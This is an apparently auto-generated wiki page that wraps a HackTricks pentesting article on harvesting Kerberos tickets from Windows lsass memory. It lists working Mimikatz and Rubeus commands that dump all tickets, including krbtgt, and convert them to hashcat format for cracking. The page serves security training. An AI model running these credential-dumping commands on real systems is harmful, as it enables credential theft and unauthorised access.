---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Harvesting tickets from Windows

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-kerberos-88-harvesting-tickets-from-windows` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Harvesting tickets from Windows](../../topics/network-services-pentesting/harvesting-tickets-from-windows.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-kerberos-88-harvesting-tickets-from-windows |
| name | Harvesting tickets from Windows |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md |

## Preserved Source Material

````yaml
_body: '# Harvesting tickets from Windows


  {{#include ../../banners/hacktricks-training.md}}


  Tickets in Windows are managed and stored by the **lsass** (Local Security Authority Subsystem Service) process, responsible
  for handling security policies. To extract these tickets, it''s necessary to interface with the lsass process. A non-administrative
  user can only access their own tickets, while an administrator has the privilege to extract all tickets on the system. For
  such operations, the tools **Mimikatz** and **Rubeus** are widely employed, each offering different commands and functionalities.


  ### Mimikatz


  Mimikatz is a versatile tool that can interact with Windows security. It''s used not only for extracting tickets but also
  for various other security-related operations.


  ```bash

  # Extracting tickets using Mimikatz

  sekurlsa::tickets /export

  ```


  ### Rubeus


  Rubeus is a tool specifically tailored for Kerberos interaction and manipulation. It''s used for ticket extraction and handling,
  as well as other Kerberos-related activities.


  ```bash

  # Dumping all tickets using Rubeus

  .\Rubeus dump

  [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))


  # Listing all tickets

  .\Rubeus.exe triage


  # Dumping a specific ticket by LUID

  .\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap

  [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))


  # Renewing a ticket

  .\Rubeus.exe renew /ticket:<BASE64_TICKET>


  # Converting a ticket to hashcat format for offline cracking

  .\Rubeus.exe hash /ticket:<BASE64_TICKET>

  ```


  When using these commands, ensure to replace placeholders like `<BASE64_TICKET>` and `<luid>` with the actual Base64 encoded
  ticket and Logon ID respectively. These tools provide extensive functionality for managing tickets and interacting with
  the security mechanisms of Windows.


  ## References


  - [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)


  {{#include ../../banners/hacktricks-training.md}}'
_relative_path: network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md
````
